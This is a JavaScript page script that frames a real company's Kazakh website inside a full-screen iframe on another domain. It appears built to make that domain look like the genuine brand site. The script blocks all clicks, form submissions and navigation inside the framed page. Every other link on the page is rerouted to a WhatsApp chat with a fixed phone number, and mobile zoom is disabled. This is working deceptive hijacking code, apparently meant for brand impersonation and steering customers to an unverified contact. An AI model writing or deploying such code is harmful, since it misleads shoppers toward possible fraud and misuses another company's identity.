document.addEventListener('DOMContentLoaded', function() {
    const whatsappUrl = "https://api.whatsapp.com/send?phone=77775061481&text=%D0%97%D0%B4%D1%80%D0%B0%D0%B2%D1%81%D1%82%D0%B2%D1%83%D0%B9%D1%82%D0%B5!%20%D0%9C%D0%B5%D0%BD%D1%8F%20%D0%B8%D0%BD%D1%82%D0%B5%D1%80%D0%B5%D1%81%D1%83%D0%B5%D1%82%20%D0%B2%D0%B0%D1%88%D0%B0%20%D0%BF%D1%80%D0%BE%D0%B4%D1%83%D0%BA%D1%86%D0%B8%D1%8F";
    const mainPageUrl = "https://minternational.ru/kz";
    const myDomain = "src2.pages.dev";
    const returnUrl = "https://" + myDomain;

    // Создаем стили для модального окна
    const styles = document.createElement('style');
    styles.textContent = `
        body.modal-open {
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            display: none;
            overflow: hidden;
        }
        .modal-content {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .modal-header {
            background: #333;
            padding: 10px;
            display: flex;
            justify-content: flex-end;
            z-index: 10001;
            flex-shrink: 0;
            position: sticky;
            top: 0;
        }
        .modal-back {
            background: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
            font-size: 16px;
        }
        .modal-frame-container {
            position: relative;
            flex-grow: 1;
            height: calc(100vh - 50px);
            overflow: hidden;
        }
        .modal-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
        }
        @media (max-width: 768px) {
            .modal-header {
                padding: 8px;
            }
            .modal-back {
                padding: 8px 16px;
                font-size: 14px;
            }
            .modal-frame-container {
                height: calc(100vh - 40px);
            }
        }
    `;
    document.head.appendChild(styles);

    // Создаем модальное окно
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <button class="modal-back">← Назад</button>
            </div>
            <div class="modal-frame-container">
                <iframe src="" class="modal-frame" scrolling="yes"></iframe>
            </div>
        </div>
    `;
    document.body.appendChild(modal);

    // Функция открытия модального окна
    function openModal() {
        document.body.classList.add('modal-open');
        modal.style.display = 'block';
        const iframe = modal.querySelector('iframe');
        iframe.src = mainPageUrl;
        
        // Добавляем обработчик для перехвата кликов в iframe
        iframe.onload = function() {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                const iframeWin = iframe.contentWindow;

                // Блокируем все возможные способы навигации
                iframeWin.onbeforeunload = function(e) {
                    e.preventDefault();
                    window.location.href = returnUrl;
                    return false;
                };

                // Перехватываем все клики
                iframeDoc.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    window.location.href = returnUrl;
                    return false;
                }, true);

                // Перехватываем отправку форм
                iframeDoc.addEventListener('submit', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    window.location.href = returnUrl;
                    return false;
                }, true);

                // Блокируем программную навигацию
                Object.defineProperty(iframeWin, 'location', {
                    set: function() {
                        window.location.href = returnUrl;
                    }
                });

                // Перехватываем history API
                iframeWin.history.pushState = function() {
                    window.location.href = returnUrl;
                };
                iframeWin.history.replaceState = function() {
                    window.location.href = returnUrl;
                };

                // Добавляем стили для отключения всех интерактивных элементов
                const iframeStyles = iframeDoc.createElement('style');
                iframeStyles.textContent = `
                    * {
                        pointer-events: none !important;
                        user-select: none !important;
                        -webkit-user-select: none !important;
                        -moz-user-select: none !important;
                        -ms-user-select: none !important;
                    }
                    html, body {
                        pointer-events: auto !important;
                    }
                    a, button, input, select, textarea {
                        pointer-events: none !important;
                        cursor: default !important;
                    }
                `;
                iframeDoc.head.appendChild(iframeStyles);
            } catch(e) {
                console.log('Failed to inject iframe handlers');
            }
        };
    }

    // Функция закрытия модального окна
    function closeModal() {
        document.body.classList.remove('modal-open');
        modal.style.display = 'none';
        modal.querySelector('iframe').src = '';
    }

    // Обработчик для кнопки "Назад"
    modal.querySelector('.modal-back').addEventListener('click', closeModal);

    // Обработчик для ссылок
    document.body.addEventListener('click', function(e) {
        const link = e.target.closest('a');
        if (!link) return;
        
        const href = link.getAttribute('href');
        const text = link.textContent.trim().toLowerCase();
        
        // Проверяем на главную страницу
        if (text === 'главная' || href === mainPageUrl) {
            e.preventDefault();
            openModal();
            return;
        }
        
        // Если модалка закрыта - все переходы ведут на WhatsApp
        if (modal.style.display !== 'block') {
            e.preventDefault();
            window.location.href = whatsappUrl;
            return;
        }
    });

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function setMobileViewport() {
        let viewport = document.querySelector('meta[name="viewport"]');
        if (!viewport) {
            viewport = document.createElement('meta');
            viewport.setAttribute('name', 'viewport');
            document.head.appendChild(viewport);
        }
        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0');
    }

    if (isMobile()) {
        setMobileViewport();
    }
}); 